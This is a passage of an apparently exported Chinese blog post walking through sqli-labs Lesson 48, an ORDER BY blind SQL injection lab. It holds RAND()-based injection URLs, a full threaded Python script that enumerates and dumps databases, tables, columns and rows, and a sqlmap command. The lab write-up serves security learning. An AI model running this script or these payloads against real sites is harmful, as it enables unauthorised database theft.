'http://10.60.250.239/sql/Less-48/?sort=RAND(true)', headers=headers).content\n\n    def run_thread(url, i, s):\n        html = requests.get(url, headers=headers).content\n        if (basehtml == html):\n            s = s | two[i]\n            m.append(s)\n\n    for i in range(8):\n        newpayload = \"\"\n        newpayload = payload + \"%26\" + \"%d=%d)\" % (two[i], two[i])\n        keys.append(newpayload)\n\n    for i in range(8):\n        t = threading.Thread(target=run_thread, args=(\n            getpayload(url, keys[i]), i, s,))\n        thread.append(t)\n\n    for t in thread:\n        t.start()\n    for t in thread:\n        t.join()\n\n    for i in m:\n        s = s | i\n    return chr(s)\n\n\ndef getdbname(url, basehtml):\n    num = getdbnum(url, basehtml)\n    lenth = get_all_db_len(url, basehtml, num)\n    dbs = []\n\n    for i in range(int(len(lenth))):\n        dbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = \"RAND(ascii(substr((select schema_name from information_schema.schemata limit %d,1),%d,1))\" % (\n                i, j)\n            dbname += and_method(url, payload)\n            print('[-]当前猜解', dbname)\n        print(dbname)\n        dbs.append(dbname)\n    print('available databases [%s]' % num)\n    for db in dbs:\n        print('[*]', db)\n\n\ndef get_table_num(url, basehtml, dbname):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s'),\" % dbname\n    payload += \"%d,1))>%d)\"\n    # print(payload)\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]数据表数 [%d]' % num)\n    return num\n\n\ndef get_all_table_len(url, basehtml, num, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(table_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' limit i,1),\" % dbname\n        payload += \"%d,1))>%d)\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"db\" + str(i) + \":\" + str(binary_search_db(url, basehtml, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'db\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n\ndef get_table_name(url, basehtml, dbname):\n    num = get_table_num(url, basehtml, dbname)\n    lenth = get_all_table_len(url, basehtml, num, dbname)\n    tables = []\n\n    for i in range(int(len(lenth))):\n        tbname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = \"RAND(ascii(substr((select table_name from information_schema.tables WHERE TABLE_SCHEMA='%s' limit\" % dbname\n            payload += \" %d,1),%d,1))\" % (i, j)\n            tbname += and_method(url, payload)\n            print('[-]当前猜解', tbname)\n        print(tbname)\n        tables.append(tbname)\n    print('Database: %s' % dbname)\n    print('[%d tables]' % num)\n    for table in tables:\n        print('[*]', table)\n\n# 获取列数\n\n\ndef get_column_num(url, basehtml, tbname, dbname):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s'),\" % (\n        tbname, dbname)\n    payload += \"%d,1))>%d)\"\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]列数 [%d]' % num)\n    return num\n\n# 获取列长度\n\n\ndef get_all_columns_len(url, basehtml, num, tbname, dbname):\n    thread = []\n    key = []\n    th = []\n    lenth = []\n    for i in range(num):\n        payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='%s' AND TABLE_SCHEMA='%s' limit i,1),\" % (\n            tbname, dbname)\n        payload += \"%d,1))>%d)\"\n        payload = re.sub(r'\\bi\\b', str(i), payload)\n        key.append(payload)\n\n    def run_thread(stri, i):\n        s = \"co\" + str(i) + \":\" + str(binary_search_db(url, basehtml, stri))\n        # print(s)\n        th.append(s)\n\n    for i in range(num):\n        t = threading.Thread(target=run_thread,\n                             args=(key[i], i,))\n        thread.append(t)\n        thread[i].start()\n\n    for i in range(num):\n        thread[i].join()\n    th.sort()\n    for i in th:\n        i = re.sub(r'co\\d+\\:', '', i)\n        lenth.append(i)\n    return lenth\n\n# 获取列名\n\n\ndef get_column_name(url, basehtml, tbname, dbname):\n    num = get_column_num(url, basehtml, tbname, dbname)\n    lenth = get_all_columns_len(url, basehtml, num, tbname, dbname)\n    columns = []\n\n    for i in range(int(len(lenth))):\n        coname = \"\"\n        for j in range(1, int(lenth[i]) + 1):\n            payload = \"RAND(ascii(substr((select column_name from information_schema.columns where table_name='%s' AND table_schema='%s' limit\" % (\n                tbname, dbname)\n            payload += \" %d,1),%d,1))\" % (i, j)\n            coname += and_method(url, payload)\n            print('[-]当前猜解', coname)\n        print(coname)\n        columns.append(coname)\n    print('Database: %s' % dbname)\n    print('Table: %s' % tbname)\n    print('[%d columns]' % num)\n    for column in columns:\n        print('[*]', column)\n    return columns\n\n# 获取字段数\n\n\ndef get_data_num(url, basehtml, tbname, dbname):\n    num = 0\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(*) AS CHAR),0x20) FROM %s.%s),\" % (dbname, tbname)\n    payload += \" %d,1))>%d)\"\n    num = binary_search_db(url, basehtml, payload)\n    print('[+]字段数 [%d]' % num)\n    return num\n\n# 获取字段长度\n\n\ndef get_data_len(url, basehtml, coname, tbname, dbname, i):\n    payload = \"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(%s) AS CHAR),0x20) FROM %s.%s limit %d,1),\" % (\n        coname, dbname, tbname, i)\n    payload += \" %d,1))>%d)\"\n    lenth = binary_search_db(url, basehtml, payload)\n    print('[+]当前字段`%s`长度: %d' % (coname, lenth))\n    return lenth\n\n# 获取字段值\n\n\ndef get_data(url, basehtml, coname, tbname, dbname, count):\n    lenth = get_data_len(url, basehtml, coname, tbname, dbname, count)\n    data = \"\"\n    for i in range(lenth):\n        payload = \"RAND(ascii(substr((select %s from %s.%s limit %d,1),%d,1))\" % (\n            coname, dbname, tbname, count, i + 1)\n        data += and_method(url, payload)\n        print('[-]当前猜解', data)\n    print(data)\n    return data\n\n\ndef dump(url, basehtml, tbname, dbname, coname=None):\n    num = get_data_num(url, basehtml, tbname, dbname)\n    if coname is None:\n        columns = get_column_name(url, basehtml, tbname, dbname)\n    else:\n        columns = coname.split(\",\")\n    print(columns)\n    datas = []\n    for i in range(num):\n        for column in columns:\n            data = get_data(url, basehtml, column, tbname, dbname, i)\n            datas.append(data)\n        datas.append('.')\n\n    res = [s.split() for s in ' '.join(datas).split('.') if s]\n\n    for i in res:\n        for j in i:\n            print('%-15s' % j, end='')\n        print(\"\\n\")\n\n\ndef main():\n    parser = OptionParser()\n    parser.add_option('-u', '--url', type='string', dest='url',\n                      help='Target URL (e.g. \"http://www.site.com/vuln.php?id=1\")')\n    parser.add_option('-D', type='string', dest='db',\n                      help='DBMS database to enumerate')\n    parser.add_option('-T', type='string', dest='tbl',\n                      help='DBMS database table(s) to enumerate')\n    parser.add_option('-C', type='string', dest='col',\n                      help='DBMS database table column(s) to enumerate, use like id,password')\n    parser.add_option('--dbs', action='store_true',\n                      dest='dbs', help='Enumerate ALL database')\n    parser.add_option('--tables', action='store_true',\n                      dest='tables', help='Enumerate DBMS database tables')\n    parser.add_option('--columns', action='store_true',\n                      dest='columns', help='Enumerate DBMS database table columns')\n    parser.add_option('--dump', action='store_true',\n                      dest='dump', help='Dump DBMS database table entries')\n    parser.add_option('--dump-all', action='store_true',\n                      dest='all', help='Dump all DBMS databases tables entries')\n    (options, args) = parser.parse_args()\n\n    basehtml = getbasehtml(\n        'http://10.60.250.239/sql/Less-48/?sort=RAND(true)')\n\n    if options.url and options.dbs:\n        url = options.url\n        getdbname(url, basehtml)\n    elif options.url and options.db and options.tables:\n        url = options.url\n        dbname = options.db\n        get_table_name(url, basehtml, dbname)\n    elif (options.url and options.db and options.tbl and options.col and options.dump):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        coname = options.col\n        dump(url, basehtml, tbname, dbname, coname)\n    elif (options.url and options.db and options.tbl and options.all):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        dump(url, basehtml, tbname, dbname)\n    elif (options.url and options.db and options.tbl and options.columns):\n        url = options.url\n        dbname = options.db\n        tbname = options.tbl\n        get_column_name(url, basehtml, tbname, dbname)\n    else:\n        parser.print_help()\n\n\nif __name__ == '__main__':\n    main()\n\n```\n\n\n\n## SQLMAP\n\n`sqlmap -u http://10.60.250.239/sql/Less-48/?sort=1 --technique B --level 2 --risk 2 --dbms mysql --threads 25`\n\n![012](/img/sql/Lesson-48/012.png)\n\n![013](/img/sql/Lesson-48/013.png)\n\n直接上结果\n\n![014](/img/sql/Lesson-48/014.png)\n\n![015](/img/sql/Lesson-48/015.png)","slug":"sqli-labs-lession-48-GET-基于错误-数字型盲注-OrderBy注入","published":1,"updated":"2019-06-19T17:23:13.395Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istkt009n4dsba1tnkbg8","content":"<h1 id=\"sqli-labs-lession-48-GET-基于错误-数字型盲注-OrderBy注入\"><a href=\"#sqli-labs-lession-48-GET-基于错误-数字型盲注-OrderBy注入\" class=\"headerlink\" title=\"sqli-labs-lession 48 GET-基于错误-数字型盲注-OrderBy注入\"></a>sqli-labs-lession 48 GET-基于错误-数字型盲注-OrderBy注入</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-48/001.png\" alt=\"001\"></p>\n<h2 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h2><p>这里没有了报错注入,使用盲注。</p>\n<p>经过判断为数字型</p>\n<p><code>http://10.60.250.239/sql/Less-48/?sort=1 desc</code></p>\n<p><img src=\"/img/sql/Lesson-48/002.png\" alt=\"002\"></p>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>可以利用rand(true/false)</p>\n<h3 id=\"获取数据库长度\"><a href=\"#获取数据库长度\" class=\"headerlink\" title=\"获取数据库长度\"></a>获取数据库长度</h3><p><code>http://10.60.250.239/sql/Less-48/?sort=rand((select length(database()))=8)</code></p>\n<p><img src=\"/img/sql/Lesson-48/003.png\" alt=\"003\"></p>\n<p>接下来拿了之前的盲注脚本改了下跑这一题了。</p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><img src=\"/img/sql/Lesson-48/004.png\" alt=\"004\"></p>\n<p><img src=\"/img/sql/Lesson-48/005.png\" alt=\"005\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><img src=\"/img/sql/Lesson-48/006.png\" alt=\"006\"></p>\n<p><img src=\"/img/sql/Lesson-48/007.png\" alt=\"007\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><img src=\"/img/sql/Lesson-48/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-48/009.png\" alt=\"009\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><img src=\"/img/sql/Lesson-48/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-48/011.png\" alt=\"011\"></p>\n<h3 id=\"临时脚本\"><a href=\"#临时脚本\" class=\"headerlink\" title=\"临时脚本\"></a>临时脚本</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br><span class=\"line\">372</span><br><span class=\"line\">373</span><br><span class=\"line\">374</span><br><span class=\"line\">375</span><br><span class=\"line\">376</span><br><span class=\"line\">377</span><br><span class=\"line\">378</span><br><span class=\"line\">379</span><br><span class=\"line\">380</span><br><span class=\"line\">381</span><br><span class=\"line\">382</span><br><span class=\"line\">383</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">from</span> optparse <span class=\"keyword\">import</span> OptionParser</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'user-agent'</span>: <span class=\"string\">'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0'</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getpayload</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> url + payload</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getbasehtml</span><span class=\"params\">(url)</span>:</span></span><br><span class=\"line\">    basehtml = requests.get(url, headers=headers).content</span><br><span class=\"line\">    <span class=\"keyword\">return</span> basehtml</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">binary_search_db</span><span class=\"params\">(url, basehtml, payload)</span>:</span></span><br><span class=\"line\">    i = <span class=\"number\">1</span></span><br><span class=\"line\">    s = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        count = <span class=\"number\">0</span></span><br><span class=\"line\">        mid = <span class=\"number\">0</span></span><br><span class=\"line\">        low = <span class=\"number\">47</span></span><br><span class=\"line\">        high = <span class=\"number\">57</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> low &lt;= high:</span><br><span class=\"line\">            mid = int((low + high) / <span class=\"number\">2</span>)</span><br><span class=\"line\">            newpayload = payload % (i, mid)</span><br><span class=\"line\">            html = requests.get(getpayload(url, newpayload),</span><br><span class=\"line\">                                headers=headers).content</span><br><span class=\"line\">            <span class=\"keyword\">if</span> basehtml == html:</span><br><span class=\"line\">                low = mid + <span class=\"number\">1</span></span><br><span class=\"line\">                count += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                high = mid - <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> count != <span class=\"number\">0</span>:</span><br><span class=\"line\">            s = s + chr(int((low + high + <span class=\"number\">1</span>) / <span class=\"number\">2</span>))</span><br><span class=\"line\">            i = i + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> int(s)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getdbnum</span><span class=\"params\">(url, basehtml)</span>:</span></span><br><span class=\"line\">    num = <span class=\"number\">0</span></span><br><span class=\"line\">    payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA),%d,1))&gt;%d)\"</span></span><br><span class=\"line\">    num = binary_search_db(url, basehtml, payload)</span><br><span class=\"line\">    print(<span class=\"string\">'[+]数据库数 [%d]'</span> % num)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_all_db_len</span><span class=\"params\">(url, basehtml, num)</span>:</span></span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    key = []</span><br><span class=\"line\">    th = []</span><br><span class=\"line\">    lenth = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        payload = <span class=\"string\">\"RAND(ORD(MID((SELECT IFNULL(CAST(LENGTH(schema_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.SCHEMATA limit i,1),%d,1))&gt;%d)\"</span></span><br><span class=\"line\">        payload = re.sub(<span class=\"string\">r'\\bi\\b'</span>, str(i), payload)</span><br><span class=\"line\">        key.append(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(stri, i)</span>:</span></span><br><span class=\"line\">        s = <span class=\"string\">\"db\"</span> + str(i) + <span class=\"string\">\":\"</span> + str(binary_search_db(url, basehtml, stri))</span><br><span class=\"line\">        <span class=\"comment\"># print(s)</span></span><br><span class=\"line\">        th.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        t = threading.Thread(target=run_thread,</span><br><span class=\"line\">                             args=(key[i], i,))</span><br><span class=\"line\">        thread.append(t)</span><br><span class=\"line\">        thread[i].start()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(num):</span><br><span class=\"line\">        thread[i].join()</span><br><span class=\"line\">    th.sort()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> th:</span><br><span class=\"line\">        i = re.sub(<span class=\"string\">r'db\\d+\\:'</span>, <span class=\"string\">''</span>, i)</span><br><span class=\"line\">        lenth.append(i)</span><br><span class=\"line\">    print(lenth)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> lenth</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 取与法</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">and_method</span><span class=\"params\">(url, payload)</span>:</span></span><br><span class=\"line\">    two = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">8</span>, <span class=\"number\">16</span>, <span class=\"number\">32</span>, <span class=\"number\">64</span>, <span class=\"number\">128</span>]</span><br><span class=\"line\">    s = <span class=\"number\">0</span></span><br><span class=\"line\">    keys = []</span><br><span class=\"line\">    thread = []</span><br><span class=\"line\">    m = []</span><br><span class=\"line\">    basehtml = requests.get(</span><br><span class=\"line\">        <span class=\"string\">'http://10.60.250.239/sql/Less-48/?sort=RAND(true)'</span>, headers=headers).content</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">run_thread</span><span class=\"params\">(url, i, s)</span>:</span></span><br><span class=\"line\">        html = requests.get(url, headers=headers).content</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (basehtml == html):</span><br><span class=\"line\">            s = s | two[i]</span><br><span class=\"line\">            m.append(s)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> 